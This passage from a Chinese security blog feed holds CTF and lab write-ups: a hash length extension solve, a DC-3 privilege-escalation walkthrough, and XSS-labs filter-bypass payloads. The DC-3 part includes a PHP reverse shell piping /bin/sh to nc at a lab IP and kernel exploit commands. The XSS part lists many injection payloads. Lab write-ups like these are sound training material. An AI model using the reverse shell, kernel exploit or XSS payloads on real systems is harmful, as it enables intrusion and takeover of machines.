<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"digest"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"admin"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"digest"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$salt</span><span class="token operator">.</span><span class="token variable">$username</span><span class="token operator">.</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"The secret_key is "</span><span class="token operator">.</span> <span class="token variable">$secret_key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"Your cookies don't match up! STOP HACKING THIS SITE."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>hash长度扩展攻击，这里推荐一篇文章<a href="https://ventureyu.github.io/2018/08/14/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95/">哈希长度扩展攻击</a><br>这里使用到工具hashpump<br><img src="https://img-blog.csdnimg.cn/672b58df3ff446078a98821ee0bf7a5c.png" alt="2"></p>
<p>将<code>\x</code>改为<code>%</code>，得到key<code>sk-he00lctf3r</code><br><img src="https://img-blog.csdnimg.cn/338b99d6f5db4cad8a6ab2ff08fc8871.png" alt="123"><br>再访问网站跳转到&#x2F;admiiiiiiiiiiin。<br><img src="https://img-blog.csdnimg.cn/b7edcf764280415dbf8e4b5da9dda22d.png" alt="1"><br>查看源码<br><img src="https://img-blog.csdnimg.cn/8b32d79da7a74173907f4b7bbc5b4413.png" alt="2"><br>使用漏洞检测工具检测，复制网址<strong><a href="http://140.210.223.216:55557/admiiiiiiiiiiin/user.action">http://140.210.223.216:55557/admiiiiiiiiiiin/user.action</a></strong><br>检测到漏洞</p>
<p><img src="https://img-blog.csdnimg.cn/39f533a11214400bb63fd2e1141eeab1.png" alt="3"><br>查看环境变量得到flag</p>
<p><img src="https://img-blog.csdnimg.cn/85007a54f8e44a86a5111539041c805e.png" alt="2"></p>
]]></content>
      <categories>
        <category>赛事WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-3</title>
    <url>/2023/07/23/DC-3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个靶场就一个目的——提权。主要写一下关键的知识点，完整流程不写了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="dirb工具进行扫描目录"><a href="#dirb工具进行扫描目录" class="headerlink" title="dirb工具进行扫描目录"></a>dirb工具进行扫描目录</h3><p>以后扫目录是又有一个新的工具——dirb。<br>使用方法</p>
<blockquote>
<p>格式：dirb <url_base> [&lt;wordlist_file(s)&gt;] [options]<br>-a 设置user-agent<br>-p &lt;proxy[:port]&gt;设置代理<br>-c 设置cookie<br>-z 添加毫秒延迟，避免洪水攻击<br>-o 输出结果<br>-X 在每个字典的后面添加一个后缀<br>-H 添加请求头<br>-i 不区分大小写搜索</p>
</blockquote>
<p>详细使用方法看这篇文章<a href="https://xz.aliyun.com/t/3958">John the Ripper</a></p>
<h3 id="searchsploit-工具进行搜索漏洞"><a href="#searchsploit-工具进行搜索漏洞" class="headerlink" title="searchsploit 工具进行搜索漏洞"></a>searchsploit 工具进行搜索漏洞</h3><p>简介：searchsploit是一个用于Exploit-DB的命令行搜索工具，可以帮助我们查找渗透模块。<br>使用方法：</p>
<p><img src="https://img-blog.csdnimg.cn/f6ff9033f2e14dd9a0d739b36280842c.png" alt="1"></p>
<p>在搜索到漏洞后将文件复制到指定目录</p>
<blockquote>
<p><code>cp /usr/share/exploitdb/exploits/php/webapps/42033.txt ./Desktop/</code></p>
</blockquote>
<p>我当时本地有这一个POC就直接用sqlmap直接报出来了账号密码。</p>
<h3 id="john工具进行密码破解"><a href="#john工具进行密码破解" class="headerlink" title="john工具进行密码破解"></a>john工具进行密码破解</h3><p>先创建一个txt文件，写入密文。<br>然后使用命令john 1.txt，很快就爆破出密码了。<br><img src="https://img-blog.csdnimg.cn/b06439e17edc43c8984860f6c30511ee.png" alt="2"><br>登录后台之后写入一句话木马。<br><img src="https://img-blog.csdnimg.cn/a276bfdc2f1a4d4dba03be0f85a5102c.png" alt="3"></p>
<p>我一开始用蚁剑连接之后进行内核提权结果最后失败了，反弹shell之后提权成功。</p>
<h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p>先查看版本信息</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/issue<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/78e3b21b476f4f90907e7c8a09de5f7b.png" alt="2"><br>获取系统内核和操作系统的相关信息</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> <span class="token parameter variable">-a</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/eb314af17f7848ff968aa5a820a7ab5e.png" alt="2"></p>
<blockquote>
<ul>
<li>Linux：操作系统类型，表示这是一个Linux系统。</li>
<li>DC-3：主机名或计算机名称。</li>
<li>4.4.0-21-generic：内核版本号，这里表示Linux内核版本为4.4.0-21-generic。</li>
<li>#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016：补丁级别和构建信息，显示了该内核是在2016年4月18日18时34分49秒（协调世界时）构建的，同时适用于Ubuntu系统，并且在构建时使用了第37个SMP（对称多处理）补丁。</li>
<li>i686 i686 i686：CPU架构，这里表示是i686架构，即32位x86架构。</li>
<li>GNU&#x2F;Linux：操作系统类型，表示这是一个GNU&#x2F;Linux系统，其中GNU是一个自由软件操作系统的组成部分。</li>
</ul>
</blockquote>
<p>后面就开始反弹shell进行提权</p>
<blockquote>
<p>kali:<code>nc -lnvp 6666</code><br>靶机:创建一个PHP文件<br><code>&lt;?php system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.206.134 6666 &gt;/tmp/f&#39;);?&gt;  </code></p>
</blockquote>
<p>wget命令下载找到的zip文件后执行以下命令</p>
<blockquote>
<p>unzip 39772.zip<br>tar -xvf exploit.tar<br>cd ebpf*<br>.&#x2F;compile.sh<br>.&#x2F;doubleput</p>
</blockquote>
<p>就可以成功提权为root了。</p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>DC</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS总结</title>
    <url>/2023/07/22/XSS%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>


<ul>
<li><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="leval3"><a href="#leval3" class="headerlink" title="leval3"></a>leval3</h3><p>leval2没有使用<strong>htmlspecialchars</strong>函数，我们可以直接输入</p>
<blockquote>
<p><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
</blockquote>
<p>但是level4使用了<strong>htmlspecialchars</strong>函数</p>
<blockquote>
<p>定义和用法<br>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。<br><img src="https://img-blog.csdnimg.cn/5e76f1783f0b4526a25482dc6c9d664a.png" alt="1"></p>
</blockquote>
<p>所以为了避免这些出现，我们可以使用<strong>事件注入</strong>，通过闭合value值，然后再用onclick弹窗，也即是</p>
<blockquote>
<p><code>&#39;onclick=&#39;alert(1)</code></p>
</blockquote>
<p>写里面之后再点击一下输入框就会弹窗了。<br><img src="https://img-blog.csdnimg.cn/0587c61ee365484b930177737361d966.png" alt="1"><br>其实上面拼接之后就是</p>
<blockquote>
<p><code>&lt;input name=keyword  value=&#39;&#39;onclick=&#39;alert(1)&#39;&gt;</code>这就好理解多了</p>
</blockquote>
<p>这里看到<code>&lt;input</code>就应该想到这个onclick</p>
<blockquote>
<p><code>&lt;input onclick=alert(11) &gt;</code>这个就是基础的弹框</p>
</blockquote>
<h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>上面的事件注入照样也可以。<br>是这里面他并没有使用<strong>htmlspecialchars</strong>，而是将输入的<code>&lt;、&gt;</code>两个字符给置空了。<br><img src="https://img-blog.csdnimg.cn/474c4cee9e9b47a3994c148fdbe5c6fe.png" alt="1"></p>
<h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p><img src="https://img-blog.csdnimg.cn/8a3a29c1c49e4dbe89bc5097276b2b3e.png" alt="1"><br>这里上面两个都不能用了，我试了一下<code>&quot;&gt;&lt;input+onclick=alert(1)+&gt;//</code>结果直接两个输入框，点击输入框也没用，因为我们所输入的就是&#x3D;&#x3D;$str&#x3D;&#x3D;的值，这样也避免不了被替换。<br><img src="https://img-blog.csdnimg.cn/982889f914994b1288a26c6cb160f3bb.png" alt="1"><br>这时候要想到使用另一种弹窗方法<code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;</code>，这里输入</p>
<blockquote>
<p><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;</code></p>
</blockquote>
<p>然后我标记的地方就是一个链接，点击之后就会执行弹窗<br><img src="https://img-blog.csdnimg.cn/a8b6e357809a4cdba1c029dcc69f52d1.png" alt="2"></p>
<h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p><img src="https://img-blog.csdnimg.cn/a0faa242e1004d579d0f14dbd48dd765.png" alt="1"><br>这关没有过滤大小写，只需要将那个前面的语句改为大写就行。</p>
<h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p><img src="https://img-blog.csdnimg.cn/9e4a5df41dc247d48a4edbd017e9ddea.png" alt="7"></p>
<p>和上题的区别就是增加了转换大小写，还有将上面那些字符给置空了，那么我们可以进行双写绕过。</p>
<h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p><img src="https://img-blog.csdnimg.cn/3adc192c19c94ffbb650b184fa0aab12.png" alt="8"></p>
<p>在这里我们上面的方法用不了了，大小写、双写都不行了，下面是用html实体编码绕过<br><code>javascript:alert(1)</code>的实体编码为<code>&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</code></p>
<h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p><img src="https://img-blog.csdnimg.cn/e67c47475bd44f05996b85c6d4e9fc22.png" alt="9"><br>这一关在上一关的基础上检查了数据中是否会有**http:&#x2F;&#x2F;**字段，这里只需要改为<code>alert(&#39;http://&#39;)</code>即可</p>
<h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p><img src="https://img-blog.csdnimg.cn/2a3dd15e795d4ba78017674caccc51d2.png" alt="1"><br>在这里题目就是一张图片，在这里唯一能下手的就是参数。<br><img src="https://img-blog.csdnimg.cn/fe7ebe0e305f47e1a721ac46ab3e3ba9.png" alt="2"><br>那么由上面代码可以看到有用的就是<strong>t_sort</strong>，而这里<code>&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;</code>将其隐藏了。</p>
<ul>
<li>这个<code>&lt;input&gt;</code>元素的作用是在一个表单中添加了一个隐藏的输入字段，名称为”t_link”，初始值为”‘<code>$str33</code>‘“。当用户提交表单时，这个隐藏字段的值会被包含在表单数据中，从而可以在后台进行相应的处理。隐藏字段常常用于在不影响用户体验的情况下传递一些重要的数据。</li>
</ul>
<p>由于input是被隐藏的，那么就需要其他方法触发，这里采用html的accesskey属性。</p>
<ul>
<li><p>accesskey 是 HTML 中的一个全局属性（global attribute），它用于指定一个快捷键（access key）来激活或焦点（focus）特定的元素。使用快捷键可以通过键盘操作来快速访问页面上的某些元素，而无需使用鼠标。<br>当用户按下指定的快捷键组合时，与 accesskey 属性关联的元素将获得焦点或激活，具体的行为取决于元素的类型。通常，浏览器和操作系统会提供不同的组合键来触发快捷键，比如在 Windows 下使用 Alt 键 + 快捷键，在 macOS 下使用 Control 键 + 快捷键。</p>
</li>
<li><p>accesskey 属性可以应用于几乎所有的HTML元素，包括链接、按钮、输入字段等等。</p>
</li>
</ul>
<p>以下是一个使用 accesskey 属性的简单示例：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>accesskey 示例<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>按下 Alt + G 快速跳转到 Google 网站：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.google.com<span class="token punctuation">"</span></span> <span class="token attr-name">accesskey</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>g<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Google<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>按下 Alt + S 快速提交表单：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span> <span class="token attr-name">accesskey</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>s<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Search<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>不同的浏览器和操作系统可能会对 accesskey 的支持有所不同。</p>
<p>所以这里我们采用<code>t_sort=2&quot; accesskey=&quot;x&quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;</code></p>
<h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p><img src="https://img-blog.csdnimg.cn/3084e320d4da420281756af0ea730012.png" alt="11"></p>
<p>bp抓包注入到referer中</p>
<blockquote>
<p><code>REFERER: &quot; type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)</code></p>
</blockquote>
<p><strong>level12</strong><br>注入到UA头中。<br><strong>level13</strong><br>注入cookie中。</p>
<h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><p><img src="https://img-blog.csdnimg.cn/afbe4c0cc5e547b989e0ee4a26074f81.png" alt="1"><br>了解一下**<a href="https://www.runoob.com/angularjs/ng-ng-include.html">ng-include</a>**：<br><img src="https://img-blog.csdnimg.cn/b5fabf566c78432b89a29ede76c26f8e.png" alt="2"><br>那这里我们利用level1进行弹窗</p>
<blockquote>
<p><code>http://127.0.0.1:2000/xss-labs/level15.php?src=&#39;level1.php?name=&lt;img src=asd onerror=alert(1) &gt;&#39;</code></p>
</blockquote>
<p><strong>level16</strong><br>空格被过滤使用换行符。</p>
<blockquote>
<p><code>&lt;img%0asrc=x%0aonerror=alert(123)&gt;</code></p>
</blockquote>
<h3 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h3><p><img src="https://img-blog.csdnimg.cn/7cc9b86cc21f419db6105b9bcea138f8.png" alt="123"></p>
<ul>
<li><p><code>&lt;embed&gt;</code>元素：<code>&lt;embed&gt;</code>是HTML中用于嵌入外部多媒体资源（如Flash动画、音频、视频等）的标签。</p>
</li>
<li><p><code>src属性</code>：这是<code>&lt;embed&gt;</code>元素的一个属性，用于指定要嵌入的外部资源的URL或文件路径。</p>
</li>
<li><p><code>&quot;xsf01.swf?&quot;</code>：这是作为src属性值的内容。它包含了”内容”这一部分。</p>
</li>
</ul>
<p>利用html事件属性</p>
<blockquote>
<p><code>arg01=11&amp;arg02=1 onmousedown=alert(1)</code><br><code>arg01=11&amp;arg02=1 onmouseover=alert(1)</code></p>
</blockquote>
<p>常见的onmousexxx事件属性：<br><img src="https://img-blog.csdnimg.cn/2a085af5a34e4826b149e8f06e710200.png" alt="3"></p>
<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<p><code>&lt;img src=1 onerror=alert(1)&gt;</code></p>
</blockquote>
<ul>
<li><code>&lt;img&gt;</code>: 这是HTML标签，通常用于在网页上显示图像。然而，它也可以被利用作为XSS攻击载体。</li>
<li><code>src=1</code>: 这里的src是<code>&lt;img&gt;</code>标签的属性，用于指定图像的URL。在这里，将图像的URL设置为1，这通常是为了让这个标签在显示图像时请求一个无效的URL，从而引发错误。</li>
<li><code>onerror=alert(1)</code>: 这是XSS攻击的关键部分。<code>onerror</code>是一个事件属性，它允许在图像加载失败时触发特定的JavaScript代码。在这里，恶意的JavaScript代码是<code>alert(1)</code>，它会弹出一个警告框显示数字1。</li>
</ul>
<blockquote>
<p><code>&lt;input onclick=alert(1)&gt;</code></p>
</blockquote>
<ul>
<li><p><code>&lt;input&gt;</code>：这是HTML标签，通常用于在网页中创建交互式表单元素。在这里，它被用作一个输入元素。</p>
</li>
<li><p><code>onclick=alert(1)</code>：这是<input>标签的事件属性之一，用于定义当用户在此输入元素上点击时要执行的JavaScript代码。在这个例子中，JavaScript代码是<code>alert(1)</code>，它将弹出一个警告框显示数字1。</p>
</li>
</ul>
<blockquote>
<p><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;</code></p>
</blockquote>
<ul>
<li><p><code>&lt;a&gt;</code>：这是HTML中用于创建链接的标签，通常用于导航到其他页面或资源。</p>
</li>
<li><p><code>href=&quot;javascript:alert(1)&quot;</code>：这是<code>&lt;a&gt;</code>标签的<code>href</code>属性，用于指定链接的目标地址。在这个例子中，<code>href</code>属性的值是<code>javascript:alert(1)</code>。这意味着当用户点击这个链接时，将执行其中的JavaScript代码，而不是导航到一个网址。</p>
</li>
<li><p><code>alert(1)</code>：这是JavaScript代码的部分，<code>alert()</code>是一个JavaScript函数，它将弹出一个警告框并显示数字1。</p>
</li>
</ul>
<blockquote>
<p><code>&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
</blockquote>
<ul>
<li><code>&lt;input</code>&gt;标签：这是HTML中创建表单元素的标签。通过使用该标签，可以在表单中添加各种输入字段，比如文本框、复选框、单选按钮等。</li>
<li><code>name=&quot;t_link&quot;</code>：这是<code>&lt;input&gt;</code>标签的一个属性。它定义了表单元素的名称，这个名称在提交表单时会被用作数据的标识符。在这个例子中，表单元素的名称是”t_link”。</li>
<li><code>value=&quot;&#39;.&#39;&quot;</code>：这是<code>&lt;input&gt;</code>标签的另一个属性。它定义了表单元素的初始值，即在用户没有输入任何值时，提交表单时会传递的默认值。在这个例子中，表单元素的初始值是一个字符串”<code>&#39;.&#39;</code>“。<br>-<code> type=&quot;hidden&quot;</code>：这也是<code>&lt;input&gt;</code>标签的一个属性。它定义了表单元素的类型，这里是”hidden”，表示这是一个隐藏的输入字段。隐藏字段不会在页面上显示给用户，而是用于在后台传递数据。</li>
</ul>
<blockquote>
<p><code>&lt;button onmouseover=&quot;alert(1)&quot;&gt;悬停在我上面就会弹窗&lt;/button&gt;</code></p>
</blockquote>
<ul>
<li>在这个示例中，有一个按钮元素(<code>&lt;button&gt;</code>)，它具有 onmouseover 属性。这意味着当用户将鼠标悬停在按钮上时，会触发 onmouseover 事件，并执行相应的 JavaScript 代码。在这个例子中，当用户悬停在按钮上时，会弹出一个警告框显示数字 “1”。</li>
</ul>
<blockquote>
<p><code>&lt;input accesskey=&quot;x&quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;&gt;</code></p>
</blockquote>
<ul>
<li><p><code>accesskey=&quot;x&quot;</code>：这是一个 input 元素的 accesskey 属性。它指定了在页面上通过键盘激活该元素所需要使用的快捷键。在这里，accesskey&#x3D;”x” 表示用户可以通过按下 Alt (或在 macOS 下是 Control) 键 + “x” 键来激活该输入字段。</p>
</li>
<li><p><code>onclick=&quot;alert(1)&quot;</code>：这是一个 input 元素的 onclick 属性。它指定了当用户点击（单击）该元素时要执行的 JavaScript 代码。在这里，onclick&#x3D;”alert(1)” 表示当用户点击该输入字段时，将会弹出一个警告框显示数字 “1”。</p>
</li>
<li><p><code>type=&quot;text&quot;</code>：这是一个 input 元素的 type 属性。它定义了输入字段的类型。在这里，type&#x3D;”text” 表示这是一个文本输入字段，用户可以在该输入字段中输入文本。</p>
</li>
</ul>
<p><strong>拓展一个</strong></p>
<ul>
<li><p>type&#x3D;”text”: 文本输入字段，用于接受任意文本。</p>
</li>
<li><p>type&#x3D;”password”: 密码输入字段，用于接受密码，输入的内容会被隐藏。</p>
</li>
<li><p>type&#x3D;”number”: 数字输入字段，用于接受数值输入，可以包含数字和符号（如+、-、小数点等）。</p>
</li>
<li><p>type&#x3D;”email”: 用于接受电子邮件地址的输入字段，可以验证输入内容是否符合电子邮件地址的格式。</p>
</li>
<li><p>type&#x3D;”url”: 用于接受URL地址的输入字段，可以验证输入内容是否符合URL的格式。</p>
</li>
<li><p>type&#x3D;”tel”: 用于接受电话号码的输入字段，可以验证输入内容是否符合电话号码的格式。</p>
</li>
<li><p>type&#x3D;”date”: 用于接受日期的输入字段，可以选择日期。</p>
</li>
<li><p>type&#x3D;”time”: 用于接受时间的输入字段，可以选择时间。</p>
</li>
<li><p>type&#x3D;”color”: 用于接受颜色的输入字段，可以选择颜色。</p>
</li>
<li><p>type&#x3D;”checkbox”: 复选框，用于选择一个或多个选项。</p>
</li>
<li><p>type&#x3D;”radio”: 单选按钮，用于在一组选项中选择一个。</p>
</li>
<li><p>type&#x3D;”file”: 文件上传字段，用于选择上传文件。</p>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>awd总结</title>
    <url>/2023/07/22/awd%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="312eecd9dd07406bc844d0fbbf178ee28f09f2a3d91c7c145a36a6d079da4b42"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>AWD</tag>
      </tags>
  </entry>
  <entry>
    <title>AmateursCTF 2023wp</title>
    <url>/2023/07/22/AmateursCTF-2023wp/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>



<p><img src="https://img-blog.csdnimg.cn/a940c784ee9a4fe2a043298e02b63070.png" alt="1"></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>虽然说这个比赛是针对于美国高中生的，可是也不是很简单，美国高中生这么D吗，该努力了 :sob:</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="waiting-an-eternity"><a href="#waiting-an-eternity" class="headerlink" title="waiting-an-eternity"></a>waiting-an-eternity</h3><blockquote>
<p>我的朋友给我发了这个网站，并说如果我等得足够长，我就可以得到并举报！并不是说我需要一面旗帜或任何东西，但我已经等了几天了，它仍然要求我等待。我有点不耐烦了，你能帮我拿旗子吗？</p>
</blockquote>
<p>抓包得到线索：<br><img src="https://img-blog.csdnimg.cn/fe692516b6d34fd1a7d34a9ef06f5ac3.png" alt="1"><br>访问后发现每刷新一次&#x3D;&#x3D;set-cookie&#x3D;&#x3D;就会变一次，它跟时间也有一些关系。<br><img src="https://img-blog.csdnimg.cn/d81d9bdd78184662817b7438e9768d5d.png" alt="2"><br>那么我们添加一个cookie值<br><img src="https://img-blog.csdnimg.cn/4913065b3b7b455ba1e53e5bda386c75.png" alt="3"><br>经过几次测试，当time为负数且足够小时就会出现flag。<br><img src="https://img-blog.csdnimg.cn/4ea4d69f2e8547b49ed15020b7e5b1f0.png" alt="3"><br>这里时间的表示你可以正常表示，也可以使用科学计数法，也可以使用&#x3D;&#x3D;-inf&#x2F;-Infinity&#x3D;&#x3D;来表示无穷小。</p>
<h3 id="funny-factorials"><a href="#funny-factorials" class="headerlink" title="funny factorials"></a>funny factorials</h3><blockquote>
<p>我制作了一个阶乘应用程序！它是如此的奇特和迷人。然而，阶乘似乎无法正确计算大数！你能帮我解决它吗？</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/3fdd0c83d0df415aa50ec3172aa80238.png" alt="1"></p>
<p>分析数据包可以猜测在切换主题的数据包中有疑似文件读取漏洞。<code>/?theme=themes/theme1.css</code>，题目给的还有附件<br>app.py文件</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request
<span class="token keyword">import</span> sys

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">factorial</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
